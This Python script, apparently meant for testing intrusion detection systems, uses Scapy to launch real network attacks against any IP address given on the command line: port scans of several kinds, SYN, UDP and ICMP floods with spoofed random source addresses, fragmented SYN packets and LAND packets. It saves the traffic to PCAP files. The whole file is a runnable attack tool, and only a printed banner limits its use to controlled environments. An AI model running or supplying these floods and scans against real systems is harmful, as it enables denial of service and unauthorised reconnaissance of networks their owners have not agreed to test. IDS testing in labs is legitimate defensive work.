#!/usr/bin/env python3
"""
Network Attack Simulator for IDS Testing
This script simulates various network attacks to test an Intrusion Detection System.
"""
import time
import random
import argparse
from scapy.all import (
    IP, TCP, UDP, ICMP, 
    RandIP, RandShort, 
    sr1, send, wrpcap,
    Ether, fragment
)

def print_banner():
    """Print a banner for the attack simulator"""
    banner = """
    ╔═══════════════════════════════════════════════════╗
    ║         NETWORK ATTACK SIMULATOR FOR IDS          ║
    ║                                                   ║
    ║  WARNING: Use only in controlled environments     ║
    ║           for educational purposes                ║
    ╚═══════════════════════════════════════════════════╝
    """
    print(banner)

def simulate_port_scan(target_ip, scan_type='SYN', ports=None, duration=10):
    """
    Simulate a port scan attack.
    
    Args:
        target_ip: The IP address to scan
        scan_type: Type of scan (SYN, FIN, XMAS, NULL)
        ports: List of ports to scan, or None for random ports
        duration: Duration of attack in seconds
    """
    print(f"[+] Starting {scan_type} port scan against {target_ip}")
    
    # Define TCP flags based on scan type
    flags = {
        'SYN': 'S',
        'FIN': 'F',
        'XMAS': 'FPU',
        'NULL': ''
    }
    
    if not ports:
        # Common interesting ports
        ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 
                 443, 445, 1433, 3306, 3389, 5000, 8080]
    
    # Add some random ports
    random_ports = [random.randint(1, 65535) for _ in range(20)]
    all_ports = list(set(ports + random_ports))
    
    start_time = time.time()
    packet_count = 0
    saved_packets = []
    
    try:
        while time.time() - start_time < duration:
            for port in all_ports:
                # Create packet based on scan type
                packet = IP(dst=target_ip)/TCP(dport=port, flags=flags[scan_type])
                
                # Send packet
                send(packet, verbose=0)
                saved_packets.append(packet)
                packet_count += 1
                
                # Slight delay to avoid overwhelming the network
                time.sleep(0.01)
                
                # Show progress
                if packet_count % 50 == 0:
                    elapsed = time.time() - start_time
                    print(f"[*] Sent {packet_count} packets in {elapsed:.2f} seconds")
    
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
    
    # Save packets to PCAP file for analysis
    pcap_file = f"port_scan_{scan_type.lower()}_{int(time.time())}.pcap"
    wrpcap(pcap_file, saved_packets)
    print(f"[+] Port scan completed. Sent {packet_count} packets.")
    print(f"[+] Packet capture saved to {pcap_file}")

def simulate_dos_attack(target_ip, target_port=80, attack_type='SYN_FLOOD', duration=10):
    """
    Simulate a Denial of Service (DoS) attack.
    
    Args:
        target_ip: Target IP address
        target_port: Target port number
        attack_type: Type of DoS attack (SYN_FLOOD, UDP_FLOOD, ICMP_FLOOD)
        duration: Duration of attack in seconds
    """
    print(f"[+] Starting {attack_type} DoS attack against {target_ip}:{target_port}")
    
    start_time = time.time()
    packet_count = 0
    saved_packets = []
    
    try:
        while time.time() - start_time < duration:
            if attack_type == 'SYN_FLOOD':
                # SYN flood: TCP SYN packets with random source IP and port
                # Using a higher packet rate and more aggressive flags to increase detection likelihood
                for i in range(20):  # Send packets in bursts
                    packet = IP(src=str(RandIP()), dst=target_ip)/TCP(
                        sport=RandShort(), dport=target_port, flags="S", 
                        seq=RandShort(), window=RandShort())
                    
                    # Send packet
                    send(packet, verbose=0)
                    saved_packets.append(packet)
                    packet_count += 1
            
            elif attack_type == 'UDP_FLOOD':
                # UDP flood: UDP packets with random data, higher packet rate
                for i in range(20):  # Send packets in bursts
                    packet = IP(src=str(RandIP()), dst=target_ip)/UDP(
                        sport=RandShort(), dport=target_port)/("X"*random.randint(1000, 1500))
                    
                    # Send packet
                    send(packet, verbose=0)
                    saved_packets.append(packet)
                    packet_count += 1
            
            elif attack_type == 'ICMP_FLOOD':
                # ICMP flood: ICMP echo requests, higher packet rate
                for i in range(20):  # Send packets in bursts
                    packet = IP(src=str(RandIP()), dst=target_ip)/ICMP(
                        type=8, code=0, id=RandShort())/("X"*random.randint(1000, 1500))
                    
                    # Send packet
                    send(packet, verbose=0)
                    saved_packets.append(packet)
                    packet_count += 1
            
            # Show progress
            if packet_count % 100 == 0:
                elapsed = time.time() - start_time
                print(f"[*] Sent {packet_count} packets in {elapsed:.2f} seconds")
                
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    
    # Save packets to PCAP file for analysis
    pcap_file = f"dos_{attack_type.lower()}_{int(time.time())}.pcap"
    wrpcap(pcap_file, saved_packets)
    print(f"[+] DoS attack completed. Sent {packet_count} packets.")
    print(f"[+] Packet capture saved to {pcap_file}")

def simulate_fragmentation_attack(target_ip, target_port=80, duration=10):
    """
    Simulate a packet fragmentation attack.
    
    Args:
        target_ip: Target IP address
        target_port: Target port
        duration: Duration of attack in seconds
    """
    print(f"[+] Starting fragmentation attack against {target_ip}:{target_port}")
    
    start_time = time.time()
    packet_count = 0
    saved_packets = []
    
    try:
        while time.time() - start_time < duration:
            # Create a large TCP packet
            large_packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S")/("X"*1400)
            
            # Fragment the packet
            fragments = fragment(large_packet, fragsize=200)
            
            # Send fragments
            for frag in fragments:
                send(frag, verbose=0)
                saved_packets.append(frag)
                packet_count += 1
            
            # Show progress
            if packet_count % 50 == 0:
                elapsed = time.time() - start_time
                print(f"[*] Sent {packet_count} fragments in {elapsed:.2f} seconds")
                
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    
    # Save packets to PCAP file for analysis
    pcap_file = f"fragmentation_attack_{int(time.time())}.pcap"
    wrpcap(pcap_file, saved_packets)
    print(f"[+] Fragmentation attack completed. Sent {packet_count} fragments.")
    print(f"[+] Packet capture saved to {pcap_file}")

def simulate_land_attack(target_ip, target_port=80, count=100):
    """
    Simulate a LAND attack (same source and destination IP and port).
    
    Args:
        target_ip: Target IP address
        target_port: Target port
        count: Number of packets to send
    """
    print(f"[+] Starting LAND attack against {target_ip}:{target_port}")
    
    packet_count = 0
    saved_packets = []
    
    try:
        for _ in range(count):
            # Create a LAND attack packet (src=dst, sport=dport)
            packet = IP(src=target_ip, dst=target_ip)/TCP(sport=target_port, dport=target_port, flags="S")
            
            # Send packet
            send(packet, verbose=0)
            saved_packets.append(packet)
            packet_count += 1
            
            # Show progress
            if packet_count % 10 == 0:
                print(f"[*] Sent {packet_count} LAND attack packets")
                
            # Slight delay
            time.sleep(0.1)
                
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    
    # Save packets to PCAP file for analysis
    pcap_file = f"land_attack_{int(time.time())}.pcap"
    wrpcap(pcap_file, saved_packets)
    print(f"[+] LAND attack completed. Sent {packet_count} packets.")
    print(f"[+] Packet capture saved to {pcap_file}")

def main():
    """Main function to parse arguments and run selected attack"""
    parser = argparse.ArgumentParser(description="Network Attack Simulator for IDS Testing")
    
    parser.add_argument("--target", "-t", required=True, help="Target IP address")
    parser.add_argument("--port", "-p", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--attack", "-a", required=True, choices=[
        "port_scan", "syn_flood", "udp_flood", "icmp_flood", 
        "fragmentation", "land"
    ], help="Type of attack to simulate")
    parser.add_argument("--duration", "-d", type=int, default=10, 
                      help="Duration of the attack in seconds (default: 10)")
    parser.add_argument("--scan-type", "-s", choices=["SYN", "FIN", "XMAS", "NULL"], 
                      default="SYN", help="Port scan type (default: SYN)")
    
    args = parser.parse_args()
    
    print_banner()
    print(f"[*] Target: {args.target}")
    print(f"[*] Attack type: {args.attack}")
    
    # Run the selected attack
    if args.attack == "port_scan":
        simulate_port_scan(args.target, scan_type=args.scan_type, duration=args.duration)
    
    elif args.attack == "syn_flood":
        simulate_dos_attack(args.target, args.port, "SYN_FLOOD", args.duration)
    
    elif args.attack == "udp_flood":
        simulate_dos_attack(args.target, args.port, "UDP_FLOOD", args.duration)
    
    elif args.attack == "icmp_flood":
        simulate_dos_attack(args.target, args.port, "ICMP_FLOOD", args.duration)
    
    elif args.attack == "fragmentation":
        simulate_fragmentation_attack(args.target, args.port, args.duration)
    
    elif args.attack == "land":
        simulate_land_attack(args.target, args.port, count=args.duration*10)

if __name__ == "__main__":
    main()